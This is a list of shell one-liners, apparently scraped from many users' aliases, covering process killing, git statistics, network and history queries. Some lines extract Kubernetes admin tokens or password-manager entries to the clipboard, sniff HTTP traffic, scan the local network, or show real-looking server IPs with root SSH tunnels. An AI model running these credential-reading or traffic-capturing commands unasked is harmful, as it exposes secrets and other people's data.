"CURRENTDISPLAY=$(xrandr | grep "" connected"" | egrep -vi ""primary"" | cut -f1 -d "" "") ; CURRENTBRIGHTNESS=$(xrandr --verbose | grep Brightness | uniq | grep -Eo ""[+-]?[0-9]+([.][0-9]+)?"") ; NEWBRIGHTNESS=$(dc --expression=""${CURRENTBRIGHTNESS} 0.1 - p c q"") ; xrandr --output ${CURRENTDISPLAY} --brightness ${NEWBRIGHTNESS}"
"CURRENTDISPLAY=$(xrandr | grep "" connected"" | egrep -vi ""primary"" | cut -f1 -d "" "") ; CURRENTBRIGHTNESS=$(xrandr --verbose | grep Brightness | uniq | grep -Eo ""[+-]?[0-9]+([.][0-9]+)?"") ; NEWBRIGHTNESS=$(dc --expression=""${CURRENTBRIGHTNESS} 0.1 + p c q"") ; xrandr --output ${CURRENTDISPLAY} --brightness ${NEWBRIGHTNESS}"
"2>/dev/null ifconfig eth0 || ifconfig en0 || ifconfig en1 | \sed -Ee 's/ ((0x)?[0-9:a-f]{3,}|[0-9.]{7,})[ %]/[(01;(38;05;122))m \1 [0m/g'"
"/opt/local/Library/Frameworks/Python.framework/Versions/2.6/bin/dnuos --list-files -S --file=Album-Info.txt --output=""[Y,4]| [n,-50]|[f,6]| [l,6] | [s,7] | [t,-4] | [q]"" --file=Album-Info.txt ""$@"""
"/opt/local/Library/Frameworks/Python.framework/Versions/2.6/bin/dnuos --list-files -S --file=Album-Info.txt --output=""[Y,4]| [n,-50]|[f,6]| [l,6] | [s,7] | [t,-4] | [q]"" --file=/Users/robbie/Desktop/music-info-`date +%d_%m_%y-%H:%M`.txt ""$@"""
"/bin/cat /proc/cpuinfo|/bin/grep -E ""processor|model name|cache size|core|sibling|physical"""
"(test ""x-"" = ""x\!*"") && cd - || (test ""x"" != ""x\!*"") && cd `(apparix --try-current-first -favour rOl \!* || echo -n .)` || cd"
"(sudo docker.io ps -a | tail -n +2 | awk ""{print $1}"" | xargs sudo docker.io rm) && (sudo docker.io images | tail -n +2 | awk ""{print $3}"" | xargs sudo docker.io rmi)"
"(echo; echo ""/-------\\""; echo ""| err.txt generated.file succ.txt err.txt generated.file succ.txt |""; echo ""| ___ ,|""; echo ""| / \\ |""; echo ""\\-------/""; echo; false)"
"(echo -n ""Password: ""; read -s pw; curl -sSL https://api.pwnedpasswords.com/range/$(echo -n $pw | shasum | cut -b 1-5) | grep $(echo -n $pw | shasum | cut -b 6-40 | tr a-f A-F))"
"(echo -n ""Password: ""; read -s pw; curl -s https://api.pwnedpasswords.com/range/$(echo -n $pw | shasum | cut -b 1-5) | grep $(echo -n $pw | shasum | cut -b 6-40 | tr a-f A-F))"
"(cd $(git rev-parse --show-toplevel) && git svn show-externals | grep ""^/"" | sed ""s|^/\([^ ]*\)\(.*\) \(.*\)|(mkdir -p \1 \&\& cd \1 \&\& if [ -d .svn ]; then echo \""svn up \2 \1\"" \&\& svn up \2 ; else echo \""svn co \2 \3 \1\"" \&\& svn co \2 \3 . ; fi)|"" | sh)"
"$(git remote -v 2> /dev/null | grep github | sed -e ""s/.*git\:\/\/\([a-z]\.\)*/\1/"" -e ""s/\.git.*//g"" -e ""s/.*@\(.*\)$/\1/g"" | tr "":"" ""/"" | tr -d ""\011"" | sed -e ""s/^/open http:\/\//g"" | uniq)"
"$( command -v /opt/firefox/firefox || command -v /opt/firefox/firefox || command -v /Applications/Firefox.app/Contents/MacOS/firefox-bin || """" )"
""aServer|ScrapActor|DbActor|RenderActor|FunLoggerActor|zapSelectorConfig|globalConfig"" \
" modinfo wfx_core | grep -E ""^filename|^version""; modinfo wfx_wlan_sdio | grep -E ""^filename|^version""; modinfo wfx_wlan_spi | grep -E ""^filename|^version"""
”ctags -R app config lib && sed -i ‘’ -E ‘/^(if|switch|function|module\.exports|it|describe).+language:js$/d’ tags”
”ctags -R app config lib && sed -i '' -E '/^(if|switch|function|module\.exports|it|describe).+language:js$/d' tags”
| grep --color -E 'Error|Warning|Missing|nag|$'
xstow -v 3 -ire 'entries|README.txt|format|.svn-base|.svn-work|empty-file'
worklog list | grep -E '(ben|cyrandy|siawyoung|ronald)' | fzf --preview 'worklog show {}' --preview-window wrap
who | sed -E 's/a|b|g|m|p/[b]/g'
vimdiff <(yadm decrypt -l | perl -anE 's/^(\\S+\\s\\w+\\/\\w+)\\s+(\\d+)/\$1 \$2/; print' | sort -k6) <(ls -l --time-style=+'%Y-%m-%d %H:%M' \$(yadm decrypt -l | perl -anE 's/^\\S+ \\w+\\/\\w+ +\\d+ [\\d-]+ [\\d:]+ //; s/ /\\ /g; print') | perl -anE 'next if /^total/; s/^(\\S+\\s)\\d+\\s(\\w+)\\s(\\w+)\\s+(\\d+)/\$1\$2\/\$3 \$4/; print' | sort -k6)
vim -c 'let g:startify_disable_at_vimenter = 1 | set bt=nofile ls=0 noru nonu nornu | hi ColorColumn ctermbg=NONE | hi VertSplit ctermbg=NONE | hi NonText ctermfg=0 | Codi'
upower -i $(upower -e | grep BAT) | grep --color=never -E percentage|xargs|cut -d' ' -f2|sed s/%//
upower -i $(upower -e | grep BAT) | grep --color=never -E 'state|to full|to empty|percentage'
upower -i $(upower -e | grep '/battery') | grep --color=never -E 'state|to\ full|to\ empty|percentage'
tree -aFCN -L 1 -I 'node_modules|bower_components|tmp|vendor|typings|.git'
tree -I \*.pyc\|\*.un~\|\*.sw[op]\|\*node_modules\*\|%\*\|.DS_Store -Ca
tree -I 'venv|__pycache__|*egg-info|htmlcov|build|dist'
tree -I 'node_modules|bower_components|ppds|_tmp|cmake-build|doxygen-build'
tree -I 'node_modules|.git|test|venv|env|.DS_Store' --noreport -C -a --dirsfirst
tree -I 'build|node_modules|env|tmp|bower_components|.git'
tree -I 'bower_components|node_modules|tmp|.tmp|.sass-cache|vendor'
tr -s ' ' | tr ' ' '\n' | tr '[:upper:]' '[:lower:]' | sort | uniq -c | sort -nr
tr -dc [:print:] < /dev/urandom | tr -d '\\\`^' | fold -w 20 | head -n 1 ; tr -dc [:alnum:] < /dev/urandom | fold -w 20 | head -n 1
tr -d '[:punct:]' | tr ' ' '\n' | tr 'A-Z' 'a-z' | sort | uniq -c | sort -rn
tr '[A-Z]' '[a-z]' | tr -cd '[A-Za-z0-9_ \012]' | tr -s '[ ]' '\012' | sort | uniq -c | sort -nr
top -l 1 -s 0 | awk ' /Processes/ || /PhysMem/ || /Load Avg/{print}'
top -bn 1 | grep -Ei --color .exe ; echo --- ; echo 'ps ax|egrep “*\.exe“|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -7 -p “$ 1“'"
top -bn 1 | grep -Ei --color .exe ; echo --- ; echo 'ps ax|egrep “*\.exe“|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -5 -p “$ 1“'"
top -bn 1 | grep -Ei --color .exe ; echo --- ; echo 'ps ax|egrep “*\.exe“|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -3 -p “$ 1“'"
top -bn 1 | grep -Ei --color .exe ; echo --- ; echo 'ps ax|egrep “*\.exe“|grep -v 'egrep'|awk '{print $1 }' | xargs sudo renice -n -2 -p “$ 1“'"
tmux ls | grep -v attached | awk '{ print $1 }' | sed 's/://' | cut -d ' ' -f1 | xargs -I {} tmux kill-session -t {}
tmux list-buffer | head -n1 | awk '{print $1}' | cut -d':' -f1 | xargs tmux show-buffer -b | pbcopy
tail -n 2000 ~/.bash_history | cut -d ';' -f 2 | awk '{print $1 '' $2}' | sort | uniq -c | sort -rn
svn stat|grep ?|egrep '\.(hpp|cpp|h|c)\>'
svn status |grep -v ^?| grep -v '\.swp$'|grep -v '\.swo$' |grep -v '~$' |grep -v '\._'
svn status | grep '^\M\|^A' | cut -c 8- | xargs pyflakes | uniq
svn st | grep -e '^M' -e '^\?' | sed s/^M// | sed s/^\?// | sed ':a;N;$!ba;s/\n/ /g' | sed -e 's/ \+ / /g'
svn st | grep '^\?' | tr '^\?' ' ' | sed 's/[ ]*//' | sed 's/[ ]/\\ /g' | xargs svn add
sudo tcpdump -i $(ifconfig -a | grep RUNNING | grep -v 'tun0\|lo' | cut -d':' -f1) -n -s 0 -w - | grep -a -o -E \
sudo sed 's/\/im\//\/gg\//g' /etc/httpd/conf/httpd.conf | sed 's/\/im /\/gg /g' | sed 's|#ProxyPass\([ \/]\+\)favicon|ProxyPass\1favicon|g' > temp.txt; sudo cp temp.txt /etc/httpd/conf/httpd.conf; rm temp.txt; sudo service httpd restart
sudo sed 's/\/gg\//\/im\//g' /etc/httpd/conf/httpd.conf | sed 's/\/gg /\/im /g' | sed 's|[^#]ProxyPass\([ \/]\+\)favicon| #ProxyPass\1favicon|g' > temp.txt; sudo cp temp.txt /etc/httpd/conf/httpd.conf; rm temp.txt; sudo service httpd restart
sudo ngrep -d $(ifconfig -a | grep RUNNING | grep -v 'tun0\|lo' | cut -d':' -f1) -t '^(GET|POST) ' 'tcp and port 80'
sudo netstat -tun | awk '{print \$6}' | sort | uniq -c | sort -n | tail -n +2
sudo lsof +c 0 | { grep 'DEL.*lib' || true } | awk '{ print \$NF }' | sort -u
sudo find /var/log -type f -exec file {} \; | sudo grep 'text' | sudo cut -d' ' -f1 | sudo sed -e's/:$//g' | sudo grep -v '[0-9]$' | sudo xargs tail -f
sudo find /var/log -type f -exec file {} \; | grep 'text' | cut -d' ' -f1 | sed -e's/:$//g' | grep -v '[0-9]$' | xargs tail -f
sudo find /!(mnt|sys|run|dev|proc|srv) -name
sudo du --max-depth=1 | sort -gr | sed 's/\([0-9]\+\)/\1K/' | sed 's/\([0-9]\+\)\([0-9][0-9][0-9]\)K/\1.\2M/' | sed 's/\([0-9]\+\)\([0-9][0-9][0-9]\).[0-9]\+M/\1.\2G/' | sed 's/\([0-9]\+.[0-9]\)[0-9][0-9]/\1/'
sm | rev | cut -d/ -f1 | rev | sort | uniq
sfood -fuq . | sfood-filter-stdlib | sfood-target-files | xargs dirname | sort | uniq
sensors|tail -n +3|head -n 1|awk '{print $4}'|grep -o -E [0-9]+\.[0-9]+|head -n 1
sed -e 's/sudo //' $HOME/.histfile | cut -d' ' -f1 | sort | uniq -c | sort -rg | head
sed -e 's/sudo //' $HOME/.bash_history | cut -d' ' -f1 | sort | uniq -c | sort -rg | head
sed -e 's/sudo //' $HISTFILE | cut -d' ' -f1 | sort | uniq -c | sort -rg | head -n 10
sed -e 's/^\(FAIL\|QWARN\|WARNING\).*/$red\\0$nrm/' -e 's/^\(PASS\|XPASS\|XFAIL\|SKIP\).*/$green\\0$nrm/' -e 's/^QDEBUG.*/$blue\\0$nrm/'
sed 's/\$NAME/$NAME/g' init|grep -v halp|grep -v export|grep -v bin\/bash|sed 's/alias //g'|sed 's/=/ /g'
sed '/REPL\|ASIO\|NETWORK\|FTDC\|to become available.\|to be elected./d'
screen -ls | sed '1d;\$d' | sed '\$d' | sed 's/[[:space:]]/ /g' | sed 's/\./ /' | column -s \
screen -ls | grep -v Socket | grep -v screens | cut -d. -f1 | grep -o '[0-9]*' | xargs -I sess screen -S sess -X quit
rubocop | egrep 'C:|W:' | sed 's/^\([^:]*\).*/\1/g' | sort | uniq
rostopic list | grep '/result\|/goal\|/status\|/feedback\|/cancel'
rm *+(.log|.aux|.bbl|.blg|.out|.toc)
qstat -xml | tr '\n' ' ' | sed 's#<job_list[^>]*>#\n#g' | sed 's#<[^>]*>##g' | grep ' ' | column -t
qstat -tfu $USER | grep -E 'Job( Id|_Name)|PBS_O_WORKDIR|exec_host|job_state'
q -Qe|awk -F'[/ ]' '/^local/{if(\$2~/-(git|svn|bzr|hg|nightly)$/)print\$2}'
pwd;find . | sort | sed '1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'
pwd;find . | sort | sed '1d;s/^\.//;s/\/\([^/]*\)$/|- \1/;s/\/[^/|]*/| /g'
pwd; find . | sort | sed '1d;s/^\.//;s/\/\([^/]*\)$/|--\1/;s/\/[^/|]*/| /g'
ps | head -1 && ps auxfh | egrep $USER | sort -nr -k 3 | head | grep $USER
ps xa | grep postgres: | grep $POSTGRESQL_DATABASE | grep -v grep | awk '{print (}' | sudo xargs kill)
ps ux | grep firefox | grep childID | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep -i '[C]hrome --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep 'chromium-browser --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep 'chrome --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep 'chrome --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs -I '{}' kill '{}'
ps ux | grep '[c]hrome --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep '[Cc]hrome --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep '[C]hromium Helper --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep '[C]hrome Helper --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep '[C]hrome Helper --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs -r kill
ps ux | grep '[C]hrome Helper (Renderer)' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep '[C]hrome Helper (Renderer) --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps ux | grep '[C]hrome --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps axu | grep Developer | grep -v Xcode.app | grep -v grep | awk '{print \$2}' | xargs kill -9
ps ax | grep spork | grep -v grep | tail -n 2 | cut -b 1-6 | xargs kill
ps ax | grep -i python | grep -i launch | grep start.py | awk '{print $1}' | xargs sudo kill
ps aux|head -1;ps aux |tail -n+2 |sort -nrk4 |head -$(($(tput lines)-2)) |cut -c 1-$(tput cols)
ps aux|head -1;ps aux |tail -n+1 |sort -nrk4 |head -$(($(tput lines)-2)) |cut -c 1-$(tput cols)
ps aux|grep 'ssh -fCPN root@47.103.128.231 -L 3307:127.0.0.1:3306'|grep -v grep|head -n 1|awk '{print \$2}'|xargs kill && ssh -fCPN root@47.103.128.231 -L 3307:127.0.0.1:3306
ps aux|grep 'ssh -fCPN remote@47.103.82.106 -L 3307:rm-uf6s0h018qv9uedzl.mysql.rds.aliyuncs.com:3306'|grep -v grep|head -n 1|awk '{print \$2}'|xargs kill && ssh -fCPN remote@47.103.82.106 -L 3306:rm-uf6s0h018qv9uedzl.mysql.rds.aliyuncs.com:3306
ps aux |head -1;ps aux |tail -n+1 |sort -nrk4 |head -$(($(tput lines)-1)) |cut -c 1-$(tput cols)
ps aux | tail -n+2 | selecta | tr -s ' ' | cut -d ' ' -f 2 | xargs kill -9
ps aux | tail -n+2 | selecta | tr -s ' ' | cut -d ' ' -f 2 | xargs kill
ps aux | grep phpstorm | grep -v grep | tr -s ' ' | cut -d ' ' -f 2 | xargs kill -9
ps aux | grep mysqld | grep -v grep | tabify | cut -f 2 | sudo xargs kill
ps aux | grep idea | grep -v grep | tr -s ' ' | cut -d ' ' -f 2 | xargs kill -9
ps aux | grep cisco | grep -v grep | tr -s ' ' | cut -d ' ' -f 2 | sudo xargs kill -9
ps aux | grep chrome | grep -v grep | tr -s ' ' | cut -d ' ' -f 2 | xargs kill -9
ps aux | grep '[C]hrome Helper --type=renderer' | grep -v extension-process | tr -s ' ' | cut -d ' ' -f2 | xargs kill
ps aux | egrep 'spring (app|server)' | tr -s ' ' | cut -d' ' -f2 | xargs -n 1 kill -9
ps -fu $USER | grep -v sshd | grep -v $SHELL | sort | grep -v sort | grep -v grep
ps -e|sort -k4|awk '{print \$4}'|uniq -c|sort -n|tail
ps -ef | grep spring | grep -v grep | grep -v killspring | awk '{print $2}' | xargs kill -9
ps -ef | grep puma | grep -v grep | grep -v killpuma | awk '{print $2}' | xargs kill -9
ps -ef | grep RunLuMP | grep bash | grep -v grep | head -n1 | awk
ps -ef | grep /Applications | grep -v grep | grep -vi iterm | awk '{print $2}' | xargs kill -9
ps -aux | grep mysql-workbench-bin | grep -v grep | tr -s ' ' | cut -d ' ' -f 2 | xargs kill
pp | cut -d' ' -f1 | sort | grep -v USER | uniq -c | sort -r
pkill -9 -f 'rb-fsevent|rails|spring|puma|webpack|ruby'
pip list | tail -n +3 | awk '{print $1}' | grep -v setuptools | grep -v pip | xargs pip uninstall -y
pip list -o $@ | grep -v Some | grep -v Could | grep -v mesos | awk '{print $1}' | xargs pip install --upgrade
pip freeze | grep -vE 'pkg-resources==0.0.0|pylint|isort|astroid|mccabe' > requirements.txt
pip freeze --local | grep -v -E '(^Django\=|^\-f|^\-e)' | cut -d = -f 1 | xargs pip install -U
pg_dump -a bss |grep -v '^\(--\)\?$'|grep -v 'PostgreSQL database dump' | grep -v '^SET' | grep -v '^--Name' | grep -v '^SELECT'
pbpaste | sed 's|^| |g' | pbcopy
pbpaste | sed 's|^ ||g' | pbcopy
pbpaste | grep 'test.*(' | cut -d\( -f1 | xargs | tr ' ' '\|'
pandoc --from markdown --to html | textutil -convert rtf -stdin -stdout -format html | sed $SED |sed $SEDLEFTQUOTE | sed $SEDRIGHTQUOTE | pbcopy -Prefer rtf
p4 opened|grep ' change '|sed -re 's/.* change ([0-9]+).*/\1/g'|sort|uniq|xargs p4 changelist -o
p4 changes -s pending -u jmickey |awk '{print \$2}' | xargs p4 describe -s | grep pending | sed -e s/comcleod@// | awk '{system( \
open `git remote -v | grep fetch | awk '{print $2}' | sed 's/git@/http:\/\//' | sed 's/com:/com\//'`| head -n1
open \`git remote -v | grep github.com | grep fetch | head -1 | field 2 | sed 's/git:/http:/g'\`
open \`git remote -v | grep github.com | grep fetch | head -1 | awk '{print $2}' | sed 's/git:/http:/git'\`
open -a 'google chrome' | open -a 'Airmail Beta 2' | open -a ical | open -a slack | open -a 'FreeChat for Facebook Messenger' | open -a 'line'
offlineimap -u Noninteractive.Basic 2>/dev/null | grep --line-buffered 'message\|account'| grep --line-buffered -v 'Copy message -\|Delet\|Adding flag'
nvp | awk '{print \$3}' | tail -n+2 | xargs -I {} sh -c 'echo Killing {}; kill {} || echo failed'
nvim -c ':sp|vsp|wincmd w|wincmd w|resize 10|te'
nmap -sA `(ip -4 addr | grep 'brd' | awk '{print \$2}')` | grep 'done' | gawk '{print \$6}' | tr -d '('
netstat -ntu | awk '{print \$5}' | cut -d: -f1 | sort | uniq -c | sort -n
netstat -ntu | awk '{print $5}' | cut -d: -f1 | sort | uniq -c | sort -n
netstat -ntu | awk 'NR>2 {print $5}' | cut -d: -f1 | sort | uniq -c | sort -nr
netstat -Watpee | sed '1d' | sed -e 's/\(Local\|Foreign\|Program\) /\1_/g' | column -t
mpv **/*.(mp4|webm|mkv|mov|m4v|avi) > /dev/null 2>&1 &
module list -l 2>&1 | ruby -e 'STDIN.readlines.tap{|s|s.delete_at(1)}.sort.each{|l| puts l}'
lsof +c 0 | { grep 'DEL.*lib' || true } | awk '{ print \$NF }' | sort -u
ls | rev | cut -d '.' -f1 | rev | sort | uniq -c
ls | grep -v '\(com\.\(android\|google\|htc\)\|mobi\.mgeek\|tritop\)'
ls /tmp/copie* | sed 's|[^\.]*.\.||' | xargs -I % mv /tmp/copie.% ./%
ls /tmp/ccopy.* | sed 's|/tmp/ccopy.||' | xargs -I % mv /tmp/ccopy.% ./%
ls /tmp/ccopy* | sed 's|[^\.]*.\.||' | xargs -I % mv /tmp/ccopy.% ./%
ls -rtd *(.c|.cpp|.py|.java|.cs|.js)*
ls -dlh ^*.(meta|csproj|userprefs|sln|unityproj|csproj)
ls -d /tmp/ccopy* | sed 's|[^\.]*.\.||' | xargs -I % mv /tmp/ccopy.% ./%
ls -R | grep ':$' | sed -e 's/:$//' -e 's/[^\/]*\//| /g' -e 's/| \([^|]\)/\`--\1/g'
ls -F | grep -v '/$' | xargs -i du -s {} | sort -rn | cut -f2 | xargs -i du -sh {}
ls -F | grep '/$' | xargs -i du -s {} | sort -rn | cut -f2 | xargs -i du -sh {}
ls -1F | sed 's/^.*//g' | grep -vE '/$' | tr -d '*' | sort | uniq
ls -1 err.txt generated.file succ.txt | rev | cut -d. -f1 | rev | sort | uniq
lpass ls | peco | sed -E 's/(.+)\[id\:(.*)$/\1/g' | sed -e 's/(none)\///g' | xargs lpass show --password | pbcopy
last|sed 's/ .*//'|sort|uniq -c|sort -nr|less
kubectl -n kube-system get secret -oname | grep eks-admin-token- | xargs kubectl -nkube-system describe | grep token: | awk '{ print \$2 }' | pbcopy
kubectl -n kube-system describe secret \$\(kubectl -n kube-system get secret | grep admin-user | cut -f1 -d ' '\) | grep -E '^token' | cut -f2 -d':' | tr -d '\t'
kill \$(ps aux | grep sshuttle | grep laylamasri | grep -v logger | grep -v grep | awk '{print \$2}')
kill \$(ps aux | grep Cisco | grep laylamasri | grep -v logger | grep -v grep | awk '{print \$2}')
kde-open \`git remote -v | grep github.com | grep fetch | head -1 | field 2 | sed 's/git:/http:/g'\`
journalctl -r -u sshd | grep -viE '192\.168\.[0-9]+\.[0-9]+|0.0.0.0' | grep -ioE '[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+' | sort | uniq
jctl -u sshd | grep 'Disconnected\|Failed\|Did' | grepip | sq
iwlist wlan6 scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'
iwlist wlan0 scanning | egrep 'Cell |Encryption|Quality|Last beacon|ESSID'
ip ro | grep -Eo 'via $IPV4_ADDR.*dev [^ ]*' | tr -s [:space:] | sed -e 's/.*dev \(.*\)/\1/' | tr '\n' ' ' | cut -d ' ' -f1
ip addr | grep inet | grep -v inet6 | grep -Ev '\slo' | cut -d ' ' -f6 | cut -d '/' -f1
ip -4 addr | grep -oP 'inet \K\w+.\w+.\w+.\w+' | grep -v '127.0.0.1' | cowsay | lolcat; echo 'You should probably also turn off your firewall!' | lolcat; python3 -m http.server 8080
inxi -c7 -FZdiflopuxxxrtcm7 && dmesg|grep -Ei 'exception|warn|fail|error|critical'
ifconfig | grep inet | sort | grep netmask | grep broadcast | cut -d ' ' -f2
ifconfig | grep inet | grep broadcast | rev | cut -d' ' -f7 | rev
ifconfig | grep inet | grep -vE '(inet6|127.0.0.1)' | awk '{print $2}' | awk -F ':' '{print $2}'
ifconfig | grep inet | grep -v inet6 | grep -v '127.0.0.1' | tail -1 | cut -d' ' -f2
ifconfig | grep flags | cut -d ' ' -f 1 | rev | cut -c 2- | rev
ifconfig en0 | grep inet | grep netmask | cut -d ' ' -f 2 | tr -d '\n' | pbcopy
ifconfig `route -n | grep -m1 -e ^'0\.0\.0\.0' |awk '{print \$NF}'` | grep 'inet ' | awk '{print \$2}' | sed 's/addr://1'
ifconfig $(route -n | head -n 3 | tail -n 1 | awk '{print $8}') | grep inet | awk '{print \$2}'
iconv -t ascii//TRANSLIT | sed -r 's/[~\\^]+//g' | sed -r 's/[^a-zA-Z0-9]+/-/g' | sed -r 's/^-+\\|-+$//g' | lcase
history|awk '{print $2}'|sort|uniq -c|sort -rn|head
history | tail -2 | head -1 | tr -s ' ' | cut -d' ' -f3- | awk '{print \
history | tail -2 | head -1 | tr -s ' ' | cut -d ' ' -f 3- | pbcopy; pbpaste
history | tail -2 | head -1 | cut -c 8- | xargs echo -n | xsel -i -b
history | sed 's/^[[:space:]]*[0-9]*[[:space:]]*//' | sort | uniq -c | sort -n -r | head -n 10
history | cut -c8- | sort | uniq -c | sort -rn | head -20
history | cut -c8- | sort | uniq -c | sort -rn | head
history | cut -c7- | sort | uniq -c | sort -nr | head -n 50
history | cut -c30- | sort | uniq -c | sort -nr | head
history | cut -c28- | sort | uniq -c | sort -rn | head -n 10
history | cut -c 8-1000 | sort | uniq -c | sort -nr | less
history | cut -c 8- | sort | uniq -c | sort -n -r | head -n 20
history | cut -c 8- | sort | uniq -c | sort -n -r | head -n 10
history | awk {'print \$2'} | sort | uniq -c | sort -k1 -rn | head
history | awk {'print \$2'} | sort | uniq -c | sort -k1 -nr | head -n 25
history | awk {' print \$2'} | sort | uniq -c | sort -k1 -rn | head
history | awk '{print \$2};' | sort | uniq -c | sort -rn | head -15
history | awk '{print \$2}' | sort | uniq -c | sort -n -r | head -n 50
history | awk '{print \$2}' | sort | uniq -c | sort -n -r | head
history | awk '{print $5}' | sort | uniq -c | sort -rn | head
history | awk '{print $4}' | sort | uniq -c | sort -rn | head
history | awk '{print $4}' | sort | uniq -c | sort -nr | head -10
history | awk '{print $4}' | sort | uniq -c | sort -nr | head
history | awk '{print $3}' | sort | uniq -c | sort -rn | head
history | awk '{print $2}' | sort | uniq -c | sort -rn | head -n 20
history | awk '{print $2}' | sort | uniq -c | sort -rn | head -5
history | awk '{print $2}' | sort | uniq -c | sort -rn | head -10
history | awk '{print $2}' | sort | uniq -c | sort -rn | head
history | awk '{print $2}' | sort | uniq -c | sort -nr | head
history 0 |tr -s ' '|cut -d' ' -f3- |tr '|' '\n' |_count
history 0 | awk '{print \$2}' | sort | uniq -c | sort -n -r | head -n 20
history 0 | awk '{print \$2}' | sort | uniq -c | sort -n -r | head -50
history 0 | awk '{print \$2}' | sort | uniq -c | sort -n -r | head
history 0 | awk '{print $2}' | sort | uniq -c | sort -n -r | head
history . | awk '{print \$2}' | sort | uniq -c | sort -n -r | head
history -n | tail -n 10 | (tac || tail -r) | gitjk_cmd
history -99999 | gawk '{print $2}' | gsort | guniq -c | gsort -rn | ghead -20
hg log | grep '^user\?'|cut -d':' -f2|sort|uniq -c|sort -nr
hess (#i)readme(|.md|.txt|.rst) || echo no readme
heroku apps -t busbud | tail -n+2 | grep . | sed 's/ .*$//' | fzf --header='Select the app you want to join' | xargs heroku join -a
gs --porcelain | grep UU | cut -d' ' -f2 | fzf | tr -d '\n' | pbcopy
grep function ~/.zsh_functions --color=never | sed 's/^function//' | sed 's/{//' | grep '[a-Za-z0-9\-_]*()' --color=always | column -t -s# | less
grep Dirty /proc/meminfo | cut -d: -f2 | sed 's/B/Byte/' | qalc -t | head -n 3 | tail -n 1
grep -v 'Hello Java!' touched_methods | grep -v '^#' | grep -v jdk/internal/module/SystemModules.hashes | grep -v jdk/internal/module/SystemModules.descriptors | sed -e 's/^/compileOnly /' | java -cp ../. Convert > touched.aotcfg
grep -o --binary-files=text '[[:alpha:]]' /dev/urandom | tr -d '[a-zA-Z]' | xargs -n $(($COLUMNS-20)) | tr -d ' ' | lolcat -f | pv -qL32k
grep -iE '(jpg|jpeg|tiff|bmp|png|gif)'
grep -i 'err\\w\\+\\|fail\\w\\+\\|undefined\\|\\w\\+\\.\\(cc\\|h\\):[0-9]\\+\\|$'
grep -e '(.org\|.com\|.net\|.edu\|.mil\|.gov)'
grep 'equation\|align\|graphics\|section\|subsection\|\
grep '@due' $MARKDO_ROOT/* | grep '\[\s\]' | colorline | reorder | sort -r | for_each_line print_line
gpg -K --keyid-format 0xlong | sed '/^\(ssb\|sec\)[#>]\?\s/ {s|/| |1;}'
git whatchanged -n 10 | grep -v Author | grep -o 'M.*\|A.*' | awk '{print $NF}' | uniq
git tidible | perl -wnle '/\.(pl|pm|t|psgi)$/ and print' | xargs perltidy -b -bext='/'
git status | grep modified|tr -s ' '| cut -d' ' -f2|fzf -m|xargs git add
git status -s | sed -e '/^[^ |\?]/d' | peco --prompt='[git add]' | awk '{print \$2}' | xargs git add
git show-branch -a | grep '\*' | grep -v `git rev-parse --abbrev-ref HEAD` | head -n1 | sed 's/.*\[\(.*\)\].*/\1/' | sed 's/[\^~].*//'
git remote prune origin && git branch -r | awk '{print $1}' | egrep -v -f /dev/fd/0 <(git branch -vv | grep origin) | awk '{print $1}' | xargs git branch -d
git remote -v | head -1 | awk '{print \$2}' | tr ':' '/' | sed -E 's/.+@/https:\/\//;s/\.git//;s/github/travis/' | xargs open
git remote -v | head -1 | awk '{print \$2}' | tr ':' '/' | sed -E 's/.+@/https:\/\//;s/\.git//' | xargs open
git ls-tree -r HEAD --name-only | xargs -I{} git blame --line-porcelain {} | sed -n 's/^author //p' | sort | uniq -c | sort -rn
git ls-tree -r -z --name-only HEAD -- . | xargs -0 -n1 git blame --line-porcelain HEAD | grep '^author ' | sort | uniq -c | sort -nr
git ls-files | xargs -n1 git blame --line-porcelain | sed -n 's/^author //p' | sort -f | uniq -ic | sort -nr
git ls-files | xargs -Iname find name -type f | xargs -n1 git --no-pager blame -f -w 2> /dev/null | strings | grep ray45422 | wc -l
git ls-files | while read f; do git blame -w -M -C -C --line-porcelain \$f | grep -I '^author '; done | sort -f | uniq -ic | sort -n
git ls-files | while read f; do git blame --line-porcelain \$f; done | grep '^author ' | sort -f | uniq -ic | sort -n
git ls-files -z | xargs -0n1 git blame -w | ruby -n -e '\$_ =~ /^.*\((.*?)\s[\d]{4}/; puts \$1.strip' | sort -f | uniq -c | sort -n
git log|grep commit|awk '{print \$2}'|tail -n 2|xargs -n 2 git diff $1 $2|$EDITOR
git log | grep -e commit | head -10 | sed -n '2p' | sed 's/commit//g' | xargs git diff
git log | grep 'Author: ' | sort | uniq -c | sort -k1rn | less
git log --since='90 days ago' --pretty=format:'' --name-only | grep '[^\s]' | sort | uniq -c | sort -nr | head -10
git log --since='90 days ago' --pretty=format:'' --name-only | grep '.js$' | sort | uniq -c | sort -nr | head -10
git log --pretty=format:'%C(yellow)%h|%Cred%ad|%Cblue%an|%Cgreen%d %Creset%s' --date=short | column -ts'|'
git log --format=%n --name-only | grep -v '^$' | sort | uniq -c |--numeric-sort --reverse | head -n 50
git log --all -M -C --name-only --format='format:' $@ | sort | grep -v '^$' | uniq -c | sort -n | awk 'BEGIN {print \
